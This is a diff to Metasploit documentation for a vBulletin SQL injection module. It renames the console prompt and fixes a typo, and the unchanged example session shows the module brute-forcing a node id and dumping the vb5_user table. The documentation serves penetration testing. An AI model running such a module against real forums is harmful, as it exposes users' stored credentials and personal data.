@@ -59,13 +59,13 @@ The base URI path of vBulletin. **Default: /**
 ## Scenarios
 
 ```
-msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > set RHOSTS 192.168.1.100
+msf auxiliary(gather/vbulletin_getindexablecontent_sqli) > set RHOSTS 192.168.1.100
 RHOSTS => 192.168.1.100
-msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > set VHOST vb.local
+msf auxiliary(gather/vbulletin_getindexablecontent_sqli) > set VHOST vb.local
 VHOST => vb.local
-msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > set TARGETURI /
+msf auxiliary(gather/vbulletin_getindexablecontent_sqli) > set TARGETURI /
 TARGETURI => /vb5
-msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > show actions 
+msf auxiliary(gather/vbulletin_getindexablecontent_sqli) > show actions 
 
 Auxiliary actions:
 
@@ -74,13 +74,13 @@ Auxiliary actions:
    DumpAll   Dump all tables used by vbulletin.
    DumpUser  Dump only user table used by vbulletin.
 
-msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > run
+msf auxiliary(gather/vbulletin_getindexablecontent_sqli) > run
 
 [*] Running module against 192.168.1.100
 [*] Brute forcing to find a valid node id.
-[+] Sucessfully found node at id 1
+[+] Successfully found node at id 1
 [*] Attempting to determine the vBulletin table prefix.
-[+] Sucessfully retrieved table to get prefix from vb5_language.
+[+] Successfully retrieved table to get prefix from vb5_language.
 [*] Getting table columns for vb5_user
 [+] Retrieved 78 columns for vb5_user
 [*] Dumping table vb5_user
